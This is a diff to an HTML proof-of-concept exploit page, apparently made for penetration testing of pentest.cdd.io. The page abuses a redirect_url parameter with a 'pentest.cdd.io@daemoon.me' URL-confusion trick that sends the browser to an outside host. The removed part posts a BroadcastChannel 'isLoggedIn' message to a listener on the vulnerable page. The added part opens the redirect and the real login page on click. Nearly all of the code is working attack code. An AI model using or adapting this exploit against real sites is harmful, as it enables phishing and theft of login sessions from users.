@@ -11,23 +11,21 @@
     <script>
         console.log("PoC Loaded");
 
-        // Create BroadcastChannel
-        const channel = new BroadcastChannel('cdd_vault_channel');
-
-        // Step 1: Open the vulnerable page with redirect_url param (this may load your payload or clone)
-        const firstWin = window.open("https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me");
-
-        // Step 2: Wait a few seconds, then send BroadcastChannel message
-        setTimeout(() => {
-            console.log("Sending BroadcastChannel message...");
-            channel.postMessage('isLoggedIn');
-        }, 3000); // wait 3s for the page to fully load and register the listener
-
-        // Step 3: Open the actual login page after message is sent
-        setTimeout(() => {
-            console.log("Opening real login page...");
-            window.open("https://pentest.cdd.io/user/session/new");
-        }, 5000); // wait 5s total (2s after message)
     </script>
+    <a href="javascript:void(0)" onclick="openTabs()">Click to start</a>
+
+    <script>
+    function openTabs() {
+    const preload = window.open(
+        "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40daemoon.me",
+        "_blank"
+    );
+
+    setTimeout(() => {
+        window.open("https://pentest.cdd.io/user/session/new", "_blank");
+    }, 3000);
+    }
+</script>
+
 </body>
 </html>
